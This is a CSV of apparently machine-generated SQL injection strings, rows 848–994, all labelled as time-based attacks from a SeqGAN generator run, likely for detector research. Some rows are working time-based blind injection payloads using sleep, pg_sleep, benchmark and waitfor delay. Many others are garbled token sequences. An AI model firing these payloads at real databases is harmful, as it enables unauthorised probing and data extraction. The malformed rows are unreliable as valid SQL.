label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""epfg""  =  ""efg""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,848
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,849
attack,"pg_sleep  (  s if ps_TIMzjrjr_arjf""  =  ""vf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,850
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'g"" like ""texgiy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,851
attack,"1  )   as where 7629  (ubmd5  (  5000000,md5  (  5   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,852
attack,or benchmark  (  5   )    )     )  ddmq   <>M7739 c not_TIMhararpemasah,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,853
attack,"; if not   (    (    (  substring   (    (  select 4240 from pg_sleep  (  10000000,MD5  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,854
attack,waitfor delay '0:0:2' m   )    )     )    y,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,855
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,856
attack,"1""  )   as gdcprvjrlcx rnd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,857
attack,1  )   as if elike sleep  (  5   )    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,858
attack,1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'o,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,859
attack,1'   )    )     )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,860
attack, (  0x4c4d6142   )    )    )    or rlike 3824 sleep  (  5   )    )     ser  )   (dserm  )   as rlike sleep  (  5   )    asbr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,861
attack,"1""  )   and sleep  (  5  )   sreeds_ where 3885 6969 from sr rl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,862
attack, (  0x4c4d6142   )    )    areeesrvre rlike sleep  (  5  )   as from   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,863
attack,waitfor delay when       sleep  (       )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,864
attack,"waitfor delay '0:0:5' and ""%""  =  7360  )     )  sddgdqxsix where 2679 rli where 3885  =  vwd   waitfor delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,865
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  """" like ""f'  =  'iactaif",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,866
attack,"""   )    )    or pg_sleep  (  __TIME__  )    and   (  __TIME___TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,867
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,868
attack, )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,869
attack,select 4871  =  6223 and  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,870
attack,",ysvry'  =  'x",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,871
attack,"waitfor delay '0:0:5' and    (     (  5000000,md5  (  select   )   (     )    )     gcjrrmhao  )    )     )  ) reelt_TIMd'  =  'hrvembfcjje0ararjl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,872
attack,0x76555642   asvjduelvb'  =  'cjremb,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,873
attack,; if not  (    (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,874
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twy""  =  ""vwf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,875
attack, or pg_sleep  (  5   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,876
attack,"1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%""  =  "";ME__TIME__  )   1   (e 5000000,ddqgefshnn ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,877
attack,"1%"" and   (  0x6d457153   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,878
attack,",   sesesets_usrvl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,879
attack,1'   )    )    ag,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,880
attack,"""  )   as  where 6767  =  benchmark  (f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,881
attack,1)  )   or   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,882
attack,"1%'   )        )    asesebbmhar""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,883
attack," (  select 6793  =  ""fdcg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,884
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,885
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,886
attack,  (  0x544d5a4c   (    (   select pg_sleep  )   ybquus,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,887
attack,"  (  5000000,md5  (  0x6d457153   )    )   6618dselgxg""  =  ""vbb",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,888
attack,"1""  )   or pg_sleep  (  5000000,md5  (  f  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,889
attack,"""  )   <> 8  )   e   (    0x4c4d6142   )    )    and like 'evmys  s )  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,890
attack,1agvvfixinwflbaon__us,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,891
attack,select pg_sleep  (  5   )    )     menovbqnonvzf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,892
attack,or sleep  (  __TIME__TIME__wq  )   d   and   (  select * from   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,893
attack,"1,waitfor igrfmn",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,894
attack,1  )   or 7528  =  1210 where 7360  =  6784 and 4240  =    )   and   (  select  (  sleep  (  5   )    (     )   and sexs  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,895
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jr'  =  'jr'  =  'g,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,896
attack,"1""  )   as where 1361 rlike sleep  (  5   )    )     )  )  bd   (  select delay not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,897
attack,select sleep  (  5   )    )     )  srmq  )   and 7165  =  7165  (  9558,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,898
attack,1'   )    )    as d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,899
attack,", if not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,900
attack,"1   )    )    or elike sleep  (  5000000,md5  (  __TIMD5  (  0x694a4745   )    )   asahlcelcelchjrememeyfs  )     )  ydo  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,901
attack,  select 4240 t  =    and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,902
attack,",waitfor or sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,903
attack, )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,904
attack,waitfor delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,905
attack,"""",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,906
attack,1 or 8594  =  8507  6223 rlike sleep  (  _dddsionvno  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,907
attack,select sleep  (  5   )    )     gcrery,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,908
attack,pg_sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,909
attack,1%'   )    )    or sleep  (  0x694a4745   )    )   sr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,910
attack,"select benchmark  (  5000000,md5  (  select 50nrmgdpfd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,911
attack,",waitfor not   (  select 8594  =    (  select 8514 sleep  (  substring   ((  5   )    )     )  )  srmd5  (  5   )    )   my",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,912
attack,", if not  )   and 8466  =  5702  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,913
attack, )    )    or sleep  (  5   )    )     )  srmd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,914
attack,1%'   )    )    or sleep  (  5   )    )     )  srmq  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,915
attack,1   )    )    asin,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,916
attack,or 1     and   (  1915,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,917
attack,1%'   )    )    aselect pg_sleep  )   d pg_sleep  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,918
attack,1%' and 2388  =  7260  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,919
attack,""";1  )   ;waitfor delay 6793  =    (  select 4240 x",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,920
attack,"1""  )   where 8781  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,921
attack,1%'   Tavbbfx,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,922
attack,", if not  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,923
attack,1%'   )    asmtsvmarar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,924
attack,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""bbpjy""  =  ""mbar3885f",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,925
attack,"select sleep  (  5000000,md5  (  'isintegratedsecurityonly'   )    )     )   aras cterjrprfg""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,926
attack,"1""  )   asi   (    (    )    (   ""%""  =  8507  (  vw   (    (   select 8594  =  8507 6969 rlike sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,927
attack,"1 or 4240(  =  9856  )   and 8514  =  4871 rlike 8514    =  5873,sleep  (  5   )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,928
attack,",waitfor delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,929
attack,"1""  )   or sleep  (  __TIME__  )    =  ""vf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,930
attack,'   )    )    rlike sleep  (  5  )   and    (    (   'q'  =  'wevfptr_evcrre,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,931
attack,""" where 1547 rlike ydpuvf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,932
attack,waitfor delay '0:0:5' and and   (  select *   (  select * from   (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,933
attack,"1""  )   as if=  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,934
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,935
attack,"""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )     very  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,936
attack,select benchmark  (  5   )    )     )  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,937
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,938
attack,"1%"" or   (  ""vjlr"" d5  (  __TIME__TIojrjr'  =  'ir'  =  'jr",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,939
attack,1 or   (  1   )    )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,940
attack,", if 7812  =  8036   )    (  'isintegratedsecurityonly'   (  0x4c4d6142   )    )    and    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,941
attack, if 7165 cje or pg_sleep  (  5   )    )    y       =    (  select 4240 vw   )    )  sysrvermeevhremseprpter_er  s ) and sleep  (  __TIME__  )   yd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,942
attack,; from   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,943
attack,1%'  )   or benchmark  (  5   )    )     )  smq,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,944
attack,waitfor delay '0:0:5'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,945
attack,' waitfor delay '0:0:10'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,946
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'n,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,947
attack,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""ijag""  =  ""if""  =  ""cmf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,948
attack,"1',aon",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,949
attack,"""   )    )    as qgse gx where 8507 2388dl6793 from sleep  (  5   )    )     )jmq   and    )    and 0 or sleep  (  0x694a4745   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,950
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""bay""  =  ""baiaia",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,951
attack," )    asbvix where 8507 rlikeu 3824  =  6272,sleep  (  substring   (    (     )   _ud",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,952
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'wfvcu,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,953
attack,0x4c4d6142 or   (  5   )    )     (  vaserprmerarpfp    o,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,954
attack," (  select pg_sleep  (  5000000,md5  =  ,waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,955
attack,   )    )     )   as gq 'as d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,956
attack,1'   )    )    or sleep  (  5  )   asddubrnd5  (  __TIME__  )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,957
attack,1'+  (  select ophz where 9158  =  9158 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,958
attack,",waitfor delay '0:0:10'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,959
attack,"1   )    )    asevfsbxvjrerub""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,960
attack,"1   )    aassvb""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,961
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ija""  =  ""'  =  'inojar'  =  'iy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,962
attack,"1""<>_  )    )   (   (  select   (  select pg_sleep  (  __TIME__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,963
attack,waitfor delay   9862    (   select pg_sleep  (  __TIME__TIME___TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,964
attack,", if not  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,965
attack,",;waitfor sleep  (  5  )   d   and pg_sleep  (  6272  0x6d457153   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,966
attack,1   ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,967
attack,select sleep  (  5   )    )     )  )    d5  (  0x76555642   )    )     )  sddpus where 7629d  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,968
attack,waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,969
attack,1%'wbmpy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,970
attack,",waitfor delay '0:0:5' information_schema.charara",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,971
attack,select benchmark  (  __TIME__TIME__    )  gcrr,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,972
attack,"select benchmark  (  5000000,md5  (  0x6d457153   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,973
attack,waitfor delay or sleep  (  0x6d457153   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,974
attack,;waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,975
attack,1'   )    )    as,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,976
attack,"select benchmark  (  sleep  (  5000000,md5  (  substring   (    (   select 4240 hbasvngxsrns where )   (   (  select   (    (    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,977
attack, )    )   or sleep  (  5   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,978
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,979
attack,",waitfor delay '0:0:2' (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,980
attack, and   (  select   (  select   (  select 4240   'gfpd'  7165 elt  (  sleep  (  5   )    )     )  sezndd5  (  5   )    )    aseedpusror where where 1547 * from pg_sleep  (  5  )   d   )    )   waitfor @@   (    )   <> from   (  '%'  =  _ddplodpd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,981
attack, (  'nvqf'  0x6d457153   )    )   sembao,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,982
attack,1'||  (  select 'sv and   g,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,983
attack,"1""   )    )    as_sevprerpjfg""  =  ""'  =  'are'  =  'b'  =  'ermarpemfmyvcjzl",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,984
attack,"1%'   )    )    or   6175  10000000,msrve'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,985
attack,"1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'dvmfg"" like ""te",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,986
attack,1  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,987
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,988
attack," (  select 4240  ' waitfor delay '  ' and elt  (  1210  =  1210,sleep  (  5   )    )    and '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,989
attack,; if not  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,990
attack,or information_schema.  (  'isintegratedsecurityonly'   )    )     )    )    ase--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,991
attack,select sleep  (  5   )    )     )     o  s__TIME__TIME__  )    and 2388  =  benchmark  (  if   (  0x4c4d6142   )    )    <> like    )    and --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,992
attack, )    )    or pg_sleep  (  _  )   d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,993
attack,1 asiybqariaqgx where 6767 rlike rlike sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,994
